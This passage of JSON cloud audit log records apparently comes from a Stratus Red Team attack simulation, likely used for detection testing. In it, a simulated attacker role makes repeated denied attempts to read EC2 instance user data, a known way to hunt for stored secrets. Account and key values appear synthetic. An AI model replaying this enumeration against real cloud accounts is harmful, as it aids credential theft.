\"AccessDenied\",\n      \"errorMessage\": \"User: arn:aws:iam::321848314756:user/christophe is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"67fa9341-bd06-4ceb-a8b8-6815522b5a1b\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:31Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"13c6f460-608a-487b-82df-9ad531b39a6f\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAMJ2320ZAXACWCPJI\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:iam::321848314756:user/christophe\",\n         \"principalId\": \"AIDA2Q68JMYYLLXFIRZ7\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: LB7cA78q30t1tPsWTMLmstV2qcxGVIDbeIQlzeLa9H7MPbjgPAHNoi51kZZmZ33zYw4qbgTCuvrDtE0vGEZRfg3WOLD6RjgUu-S9h-hnkY4DsAaweKHsmLzpRYc1iZ69Re7Yghrc9uua92glqVFHOCjGSYgk3RuA6BTQMfJxYEc4Y1LVk-NXUEWwPki_ubaTquUUHUudZbS6yRuyUInvSIMlA6t1P3Adv0uKpnPCPjdJ9oeF8x7i3oL0WuSx7QVWW_p4fX5teDwqmm_O6wHslKfrCBaD56so68LXhYb1OoeTFsh5AmPX_jN5y_Xk7b5jdm-LmTNtmslSZ6Kaz30ThcPPsInsmOQYgrPeOCOixVHoKbedfYIb8V-KZsKhsryeFg5ap1Xo64XepKfWPEY2WsLWZpgOAJ6n9mlq6qVzsXb7XOvJ-rtaX4e6nRJczkf5oA3NCnKpUHckI0SW6mv0IeSmE79YKnD22mJ0Jk1mWQmu6Ojs03ijwK4bZAJ7KqgFd9OiGBiQHiYCYqLR6jhjr5Iw9z4r9Zu-Rk3L50nZ8Yodj9prBWQuGPapLAN-2zExiOPr3JI\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"971a0ce7-1f66-4dba-918d-cd2a5b12ebe5\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:38Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"1d4bd0bb-0761-4c4e-9cf3-60eb78dc69be\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-eacdbb0b\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: VUo9HEgnkqejRmwZ981TtFTVCu8SFtMJJcOgZYlCFTsJTpYwp7FVaiOvMufhCY1iszVV-5YVWpcFtyZ3ygwVzqbJ4QStjDU_R92FtZMlO5oO-l-XVgaf8Z5JuyUs1ulVWrY25HY3Kt2L08win1DK-vtsE8-b4Ewe2-tDlTBHmKiR8mfUD3BO_fH73yhWkLoDD1s0Pa4hKv3auv5jGd-564yRXr0Rx_IGTFoi2hBTs5VN9-MQOc8VUlw-RMyZu-YT-dRajZ9TdH3VRvyGzLKuhrcu-fwBcXhUaHR99Z5HvPiQjRpvkMb9lth6oMpkMaZenHwm67D8l2xDca6-2GTMLatZbJZO43gibKowBQPku1aX_ji7KwMjK4qec-p0pwexuc7wfaxiej9lqGg3P0Zhf2Zv8wq_5mj0IP9oWc_RwS_MIWxMtYQ_oMfn5qd6w9DkGxikX0H0VvG5sGdwv6QYr9BJHPmJRqy6vb6RK9N9t3ZTdm8NqJGlInmdKYwXEWvyaPofwoj-BhZhfuDYXyMOgDBaA6aOncL3_H3kQsV0YWvAqIZiGQsjb8ivWAnY0MpPYK_69_c\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0ee61554-ac1d-4c40-abde-2ff51473f180\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"c32c0316-5ddb-441a-bbdb-aaf2a6b9e44f\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-66a17941\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: uOFPYQO23u4TQn2JQmg4tRDYkzz74KyWtOKizw8XEkx3-OWmistPtzU2fOb6WQoI3PW7pMHipebgFskL2-k__VUGSdmyNRkCBGyz4YAIBQ_aFO_WZZ5qC2FPxzQEtb6EB34yQ4Blutwafq-hERt2vxzyyVWU2sg7vZB-ydJSYkpb5vClj5OY0qTANhe58P7DtwcGhfrusetkwZ6Qyk52M3ctvCVHeFg-dPU5fFit7Tn9HmsQ7D9zCB-_vHErBqOl497_y-gXeRCdaO7brcVkZerWLQtbpSKWy9_i0WT1SvwQ4-cGbVvKinApvGtdYT-WlvrV3DWyPhdQzbSQJru8yQKAwmp4vshdSjvQ8T4B5VjdqOuflOsRuciuOrF_o_ZKiQYDOXrrAI-Mkd9LNCvwe-DAS60EUV1wQDFFJEXWg4e2_AX1IB5G0LQwbARXBoYrK4tZe5SY_aNp-vePaCjUDkvM7SXdSiMc2NCxSrRd7QVUdgp8uH2iHelrO_g2c9N5Yk6B5rdqVOIeVziuR575r9U2slnzaS_VDgAiAKekNsqltWp_cw5RPQqUBU6w_H0Le9wevYM\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3178929b-eb35-4a1b-b479-de1ca5187fb9\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"1b702f59-5907-4faf-9f33-a187407f03c3\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-4cb766e5\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: Enl2ZFI8qzZz7FJbafChbyrAXg2YIjHajQvck025ERtfChE6SPPSWQgqVtk3hlhPmmXtygl2topFTLBMetoZpEkbrp12Jmy_tJvy8coKgQvYNRbwgexE1sgGHrFIR8lN-4kQFN8DwhrHJpJEnktXjp3resU01Or6e_LFeuTG64mgJd3586EywcHHGevMRLvK05jO0RMJqsg6b0cmKYpRUv2FxOKJhMCgGsiP4DhL3XGcXpfGKJ7HZnPG75uExMS35jH5ct2jTai8FEXolH0REk3zkQ5-siB6c-ZTim-4kzEf8NlVS5WMz4y224S-uZfzVCJF5V1tlpAAAcVDqXcCPPYnvDFCrAEvSHwVbz_J-4b0PsIwup0JrQjvO-Y_PCAlmEGdKqnjE6ByjPJ8t_kJ-1DbTZoQyBYxk9iy17MtSogtNbvheLUVRiWUfbFu-PGFNRrbsQLMveCKFWyDxohCcSIrt8wFZiHiW3GtSGcZEPGyIkx8J70WeW43xOdi2kqy2Qpy9IqDpI76QhdyOrq1I3w2mno52gIZ8DMcjteDEjpvpAVjBYQ7V61LAeV6sjkBlreXHcw\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"66ffee8d-1866-43f6-b17e-4ffe3ddf8503\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"e58d7e06-a5eb-4a74-b8cd-d6f340b93b8f\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-346d369e\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: vdeCm58kZaHVcu0-M4yWQZUpPdeSvQM-HOZwlDrMda0wvu4tI52g4nlMc0Rr-8BzALqkpYMuU5gfkKjRboEAzaWBoLGR-MNnaDfrQoZRMHXd96e10UDh-IWDRcWvUGoS29l674DRl_WTDfwz5b021AAGHfMZS9NU1CXWZT3XvniJW0Q14EAovh_9HRYT0aQQqTBiF7M3KmaTaY4u1bCufp8Dx5zVbauuOnMDlXVAJhGHbSFCF8-ZzlK0D4kfdFboZSbIquw7xaMxjqD9LTBjl2K1g_2858Z41gZo4Km4lkjTPWXpoJtyYc3Fz3YSglZCutzv0CfWlDNziCj2SRPJeU0Y3Pro30Hczj_Z_knNWTauA_xr19CHjDRpmjab_BFA263eRFGZsZCFQXf1xlZBFSVvFEEBuo7hZ9USZ0hnoK3rq2njhNyDpefpqgIE8oWr82G0n9sqVVYj9TpX45obBsMHR-CXdnG5OsoQlrxl8-EjJYR2ugB6E3PhPFklgGf6Bj6I8P2tpQqqxGMHXcPlnj2tPoze4YzOlzrWhXi5aj7SuDoKgcYRm_R8WSKjUA1yBN7pFfI\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b307eaf9-2be2-44dd-b942-ce2bc8a3cc57\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"30ac0390-1bf8-41bc-af5b-a470776973f3\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-cee23f5f\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: VTgeZY1vPG9JN8RDG5_1wKNkdZA63luKUmEpRzFkvdZUvjd_rcKLffOZqwXDA20cPdJHu1l7vHPCLGfLM8Fb11o5jWDblvEI9qwX8qPQrLXY2_eOGXR8PLPa_uSLkcCKg4f38m_O0kz7Ss9Re9cvEKgSeD6ARS2Z3cN525WfqGuMCutpegkhku4TeuGzROO7rfPShnztzzxqtN0gdb4g7eIlfUIxEPSAhGChhW8eDQCetI3WtssEwXQYkzHd6-9YIHxW8yw8P3enNKq3QgT2oaVMeOzZAFJDn6QukrYhFXu0Tr12gRnBNRWRpP5fFIoSwoMvd2AAhBTSAdpZwIv4_sN-aCGmR7QVs6sywfgXgJTOd6bKFMcM5nFp_-D0ZV-u057MMLcBc_mhrNU3vLIZ5aWoPSHaSkSyk6LlUpPRiuoASfphMxGjbVCeof0r9chjZtEi9bJE0DaRvPqYQTj4Bumpp4EO8PP7xUJ5XPKiDdUwxRF1zy_9pxLFL7hkkmAr-AAEtoGqPAfX9BtVS_HgahYXdC7lNRuHmmYmmgcDbOuU5yaHcrBMcEbr6JJXapgvJZlhXtg\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"205f694d-35d4-4e33-9f38-f5e7a20ffa50\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"add1b208-55c2-4f2d-8b7a-cd9aeb2b177a\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-1780bff0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: nLsOD7QpVpUhY_D5_xjyMrx2F-tbtuHhu4c9a2WnPRM5-j5JMzduGPr7dEt-PwGW39koU0YG9NsH40_CiWm2POy8r3JRQWYpHy9YGMbIsk-lPk7u5BVYvDPhPswVHoxYQcubUkNE9MKzgUHD6--rhHlErfgmG-x3-E_x56A2qqvpJhCVEt5ZPDBpMsGDQBAA6sxgI13hiR9Vj3vXmokTk0pwl6VY_GWRTRGxoTSC0EnzwsbLMlyMrdnKcQOPOizQstA6FqAoKiwk3B1T36AMuZ3DFeFKBCwatonhnDeqVEp1HFs0v1qWqSPQ3CMcxFmVai0VlKB-gh24bJ2eYJSraA3XqkzMMpuXCsaP3gVvY50wV5AtbO6s2mcy2hFikUoH-J7VUkhnAUf5v1fW_M9n1MKJ3-JINpVmeMVWGKHy2hCtuV0nK5mckvWfo1pX1yGR7rC8hz8mdDUdMpaOydDrCIapx-NYuZqd_8SbaeetsrJu-EUK2YwLc4WocKHP3yW7OZlwkhUt4RvSpZqkiYJ-F-HZKLsQ4fs6Yr5qy2RiIepTENiSzuD5wI0iZW21XRS5DoYm\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"330b18f1-2763-4429-acf9-7293a5604ef3\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"9df72845-fbec-4178-9713-adcbccb99499\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-42416187\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: x6ukywL8Prh8nVwqNu_jfGpoVhNz64Z2oWssU-lfo9LLvZgrVpP7_U8FCvEfahACLHt9q3SN5BHNoKIqpT6Nse1a8IDd5T5UFtN5NAbm-8IlIjrfta55z8CdeQuyYW8g4n4fdzLRFY7P-bCnEWRyA96Dj7dgYI0-3JwYfoxyD5LqbNAyZZzXs6HzhE-JC2cNtX7pAnJyY5iqd7yKcM4tQDl-A1paYlQXwmp9jeYbixy09q2yEWVn0GnmDZpc-1YJdX7-G9RWvGb55cgx6G6QwX_V8O3GlbUtJoy5L1yJF9VHSjpNGcUjC1_T6pZoOquGL6HC1P2j4oU_vvThGAuyJtZ5hlwZA313Jwfx-YoFU3kncWiw9IXtxpgc120lSkcUt46AE9Uc47TT8jzAbBJhhIeA1lw8eh89JNMPOrGx5pTVqnmHdC6mZ92mnS5Iae0oAXY-T406pDrEIkdXtv3cbMeuBUNGfvn3O6xteP0i0gZdNPhCPxkTEDZRF-EgQs3TD2TwWIdbcoVDpTvPbf74xNHaDBFtFmcW_TW0XwiisyiaM8Ho5VTvUUQohR-ForP1xTRupKo\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"95da874e-1cbd-47df-bba6-26dd2ed9ad82\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"d94b9d47-13c6-46cf-a8c6-4d7a33d7b85c\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-68604a68\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": 